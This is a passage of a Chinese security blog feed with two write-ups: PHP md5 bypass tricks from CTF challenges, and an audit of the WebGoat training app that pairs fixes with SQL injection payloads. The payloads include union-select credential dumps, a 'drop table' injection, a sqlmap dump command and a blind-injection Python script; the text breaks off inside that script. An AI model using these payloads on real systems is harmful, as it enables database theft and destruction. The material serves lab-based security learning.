&lt;p&gt;&lt;strong&gt;raw&lt;/strong&gt;: 可选参数 TRUE 或 FALSE。FALSE（默认，32 字符十六进制数）；TRUE（原始 16 字符二进制格式）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是说当第二个参数为 true 时，返回的是原始 16 字符二进制格式的散列值，会被当做 ascii 码字符串处理（？）&lt;/p&gt;
&lt;p&gt;⭐原始二进制数据指原始字符串转换成 ascii 码后组成的字符串&lt;/p&gt;
&lt;p&gt;所以只需要找到一个 str，经过 md5 (str, true) 加密后，再转成 ascii 码字符串，包含我们需要注入的字符即可&lt;/p&gt;
&lt;p&gt;看 sql 语句&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from &amp;#x27;admin&amp;#x27; where password=md5($pass,true)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;将 where 后的条件恒为真时，我们就可获取 admin 表中的所有数据&lt;/p&gt;
&lt;p&gt;🐴能用的字符串&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;content: 129581926211651571912466741651878684928hex: 06da5430449f8f6f23dfc1276f722738raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&amp;#x27;or&amp;#x27;8string: T0Do#&amp;#x27;or&amp;#x27;8content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: &amp;#x27;or&amp;#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1cstring: &amp;#x27;or&amp;#x27;6]!r,b&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当且仅当 or 后字符串开头字符为 0 时，返回 false&lt;/p&gt;
&lt;p&gt;输入 payload，跳转至 levels91.php，源码中包含提示：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;];&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;];&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; != &lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt; &amp;amp;&amp;amp; md5(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;) == md5(&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;))&amp;#123;    &lt;span class=&#34;comment&#34;&gt;// wow, glzjin wants a girl friend.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当字符串 a，b 不相等，md5 加密后的字符串相等后，进入 if 中没有放出来的代码&lt;/p&gt;
&lt;p&gt;⭐5️⃣⑧訾 Dao の 4：md5 () 或者 sha1 () 之类的函数计算的是一个字符串的哈希值，对于数组则返回 false，如果&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mtext&gt;和&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;a和&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;和&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; b 都是数组则双双返回 FALSE, 两个 FALSE 相等得以绕过&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?a[]=111&amp;amp;b[]=www&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;跳转至 levell14.php&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;highlight_file(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;param1&amp;#x27;&lt;/span&gt;]!==&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;param2&amp;#x27;&lt;/span&gt;]&amp;amp;&amp;amp;md5(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;param1&amp;#x27;&lt;/span&gt;])===md5(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;param2&amp;#x27;&lt;/span&gt;]))&amp;#123;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$flag&lt;/span&gt;;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload (POST 请求):&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;param1[]=1&amp;amp;param2[]=2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一样の zsd&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考链接&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/iczfy585/article/details/106081299&#34;&gt;PHP 中 md5 常见绕过&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.w3school.com.cn/php/func_string_md5.asp&#34;&gt;PHP_md5 函数&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/&#34;&gt;探究 php 的 MD5 函数输出的原始二进制数据是啥？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/wangtanzhi/p/12304899.html&#34;&gt;哒暗&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;未完待续…&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2021/01/28/webgoat%E5%AE%A1%E8%AE%A1/</guid>
            <title>webgoat审计</title>
            <link>http://example.com/2021/01/28/webgoat%E5%AE%A1%E8%AE%A1/</link>
            <category>webgoat</category>
            <pubDate>Thu, 28 Jan 2021 09:28:50 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;搭建概述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#搭建概述&#34;&gt;#&lt;/a&gt; 搭建概述&lt;/h1&gt;
&lt;p&gt;前提：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Java 11&lt;/li&gt;
&lt;li&gt;Maven &amp;gt; 3.2.1&lt;/li&gt;
&lt;li&gt;IDEA&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下载源码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git clone https://github.com/WebGoat/WebGoat.git&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;打开 idea 导入 maven 项目，build 完成之后，打开 localhost:8080/WebGoat，注册账户&lt;/p&gt;
&lt;h1 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入&#34;&gt;#&lt;/a&gt; Sql 注入&lt;/h1&gt;
&lt;p&gt;select department from employees where first_name=‘Bob’&lt;/p&gt;
&lt;p&gt;update employees set department=‘Sales’ where first_name=‘Barnett’&lt;/p&gt;
&lt;p&gt;alter table employees add column phone varchar(20)&lt;/p&gt;
&lt;p&gt;grant alter table to UnauthorizedUser&lt;/p&gt;
&lt;p&gt;12:’; update employees set salary=1000000 where last_name=‘Smith’;–&lt;/p&gt;
&lt;p&gt;13:’; drop table access_log;-- -&lt;/p&gt;
&lt;h2 id=&#34;漏洞描述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;当应用程序将用户输入的内容，拼接到 SQL 语句中，一起提交给数据库执行时，就会产生 SQL 注入威胁。攻击者通过控制部分 SQL 语句，可以查询数据库中任何需要的数据，利用数据库的一些特性，甚至可以直接获取数据库服务器的系统权限。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;字符拼接的方式拼接 sql 语句，并且没有做任何过滤直接执行&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;sql-injection–&amp;gt;SQLInjectionChanllenge&lt;/p&gt;
&lt;p&gt;使用预编译 PrepareStatement，实现数据代码分离&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;sql1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;根据代码找到注入点，用 sqlmap 跑，payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sqlmap.py -r 1.txt --method PUT --data &amp;quot;username_reg&amp;quot; -D PUBLIC -T CHALLENGE_USERS -C password --dump&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是可能由于服务器的原因，跑了很久，还跑错了，密码应该是 thisisasecretfortomonly&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;sql9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sql-injection–&amp;gt;SQLInjectionLesson6a&lt;/p&gt;
&lt;p&gt;使用预编译 PrepareStatement，实现数据代码分离&lt;img src=&#34;sql2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;payload (注意字段类型要对应)：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;-1&amp;#x27; union select userid,user_name,password, cookie,&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;,0 from user_system_data --&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;sql8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sql-injection–&amp;gt;Servers&lt;/p&gt;
&lt;p&gt;列名不能加双引号，所以只能用字符拼接的方式拼接 sql 语句，建议对列名进行白名单过滤&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@ResponseBody&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; List&amp;lt;Server&amp;gt; &lt;span class=&#34;title&#34;&gt;sort&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;meta&#34;&gt;@RequestParam&lt;/span&gt; String column)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        List&amp;lt;Server&amp;gt; servers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; (Connection connection = dataSource.getConnection();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             PreparedStatement preparedStatement = connection.prepareStatement(&lt;span class=&#34;string&#34;&gt;&amp;quot;select id, hostname, ip, mac, status, description from servers  where status &amp;lt;&amp;gt; &amp;#x27;out of order&amp;#x27; order by &amp;quot;&lt;/span&gt; + column)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ResultSet rs = preparedStatement.executeQuery();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (rs.next()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                Server server = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Server(rs.getString(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;), rs.getString(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;), rs.getString(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;), rs.getString(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;), rs.getString(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;), rs.getString(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                servers.add(server);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; servers;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;sql4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图:&lt;/p&gt;
&lt;p&gt;sqlmap 不太好使，太慢了，然后就看见大佬写的脚本&lt;/p&gt;
&lt;p&gt;布尔盲注，根据返回数据的排序来判断真假 (tql)&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# -*- coding:utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; string &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; digits&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chars = digits+&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;headers = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;X-Requested-With&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;XMLHttpRequest&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cookies = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;JSESSIONID&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;D81iy9aS29fcA8JZUl1QEdeNBahRWoMFk8YyziGj&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;JSESSIONID.75fbd09e&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;7mc1x9iei6ji4xo2a3u4kbz1&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;result = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxy=&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;http&amp;quot;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1:6666&amp;quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    i += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    temp = result&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; char &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; chars:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        vul_url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,&amp;#123;0&amp;#125;,1)=&amp;#x27;&amp;#123;1&amp;#125;&amp;#x27;%20from%20servers%20where%20hostname=&amp;#x27;webgoat-prd&amp;#x27;)%20then%20hostname%20else%20mac%20end&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(i, char)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# print(resp.json())&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;webgoat-acc&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; resp.json()[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;hostname&amp;#x27;&lt;/span&gt;]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result += char&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; temp == result:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;select * from table where &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;column = &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;case&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;when (select substr(ip,&amp;#123;0&amp;#125;,1) = &amp;#x27;&amp;#123;1&amp;#125;&amp;#x27; from server where  hostname = &amp;#x27;webgoat-prd&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;then 